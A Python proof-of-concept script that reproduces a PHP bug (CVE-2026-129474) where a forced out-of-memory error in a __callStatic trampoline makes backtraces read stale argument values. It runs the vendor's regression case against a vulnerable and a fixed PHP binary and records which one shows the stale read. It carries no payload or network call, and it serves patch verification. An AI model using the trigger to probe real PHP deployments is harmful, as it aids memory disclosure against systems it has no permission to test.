#!/usr/bin/env python3
"""CVE-2026-129474 / GHSA-8mjj-2r7p-4hg2: magic-method backtrace stale args.

Runs the vendor's own regression case (php-8.5.13 Zend/tests/
GHSA-8mjj-2r7p-4hg2.phpt) against a vulnerable and a fixed PHP CLI:

    class C { static function __callStatic($name, $args) {} }
    $a = str_repeat('a', 1*1024*1024);
    C::test(1, 2, 3, 4, $a.$a);

With fatal_error_backtraces=1, zend.exception_ignore_args=0 and
memory_limit=4M the soft OOM in CONCAT is handled at DO_FCALL, while the
__callStatic trampoline frame is current. `debug_backtrace_get_args()` on
8.5.12 treats the trampoline frame as an ordinary user frame and applies the
extra-argument CV/TMP offset, reading the wrong zvals. Expected args
(1, 2, 3, 4, 'aaaa...'); vulnerable build prints shifted/stale args.

Usage: python3 php2shell-cve129474.py VULN_BIN FIXED_BIN [OUTDIR]
No network: local CLI processes only. ZendMM must be enabled (default).
"""
import pathlib
import subprocess
import sys

INI = [
    '-n',
    '-d', 'fatal_error_backtraces=1',
    '-d', 'zend.exception_ignore_args=0',
    '-d', 'memory_limit=4M',
]
SCRIPT = r'''<?php
class C {
    static function __callStatic($name, $args)
    {
    }
}
$a = str_repeat('a', 1*1024*1024);
C::test(1, 2, 3, 4, $a.$a);
'''
CORRECT = "C::test(1, 2, 3, 4, 'aaaaaaaaaaaaaaa..."
STALE_MARK = "C::test(3, 4, '"


def run(bin_path, script, out):
    cp = subprocess.run([str(bin_path)] + INI + [str(script)],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        timeout=60)
    text = cp.stdout.decode(errors='replace')
    out.write_text(text)
    frame = next((ln.strip() for ln in text.splitlines() if '#0 ' in ln), '')
    return cp.returncode, frame, text


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    vuln = pathlib.Path(sys.argv[1]).resolve()
    fixed = pathlib.Path(sys.argv[2]).resolve()
    outdir = pathlib.Path(sys.argv[3]).resolve() if len(sys.argv) > 3 else \
        pathlib.Path(__file__).resolve().parent.parent / 'build' / 'evidence' / 'w29-cve129474'
    outdir.mkdir(parents=True, exist_ok=True)
    script = outdir / 'ghsa-8mjj-2r7p-4hg2.php'
    script.write_text(SCRIPT)

    vrc, vframe, vtext = run(vuln, script, outdir / 'vulnerable.log')
    frc, fframe, ftext = run(fixed, script, outdir / 'fixed.log')
    print(f'vulnerable rc={vrc} frame: {vframe}')
    print(f'fixed      rc={frc} frame: {fframe}')

    stale = STALE_MARK in vframe and ', NULL, NULL)' in vframe and CORRECT not in vframe
    good = CORRECT in fframe
    verdict = 'CONFIRMED' if stale and good else 'NOT CONFIRMED'
    print(f'verdict: {verdict} (stale-arg read on vulnerable, correct args on fixed)')
    (outdir / 'verdict.txt').write_text(
        f'verdict: {verdict}\nvulnerable: {vframe}\nfixed: {fframe}\n')
    return 0 if verdict == 'CONFIRMED' else 1


if __name__ == '__main__':
    sys.exit(main())
